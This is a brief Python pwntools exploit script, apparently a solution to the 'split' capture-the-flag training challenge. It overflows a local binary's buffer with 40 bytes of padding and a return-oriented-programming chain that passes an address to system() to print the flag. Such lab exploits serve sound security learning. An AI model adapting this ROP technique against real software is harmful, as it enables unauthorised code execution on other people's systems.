# -*- coding: utf-8 -*-
from pwn import *
p = process('./split')
p.recvuntil("> ")
pop_rdi_ret = 0x0000000000400883
call_system = 0x400810
cat_flag = 0x601060
payload = "a" * 40 + p64(pop_rdi_ret) + p64(cat_flag) + p64(call_system)
p.sendline(payload)
p.interactive()


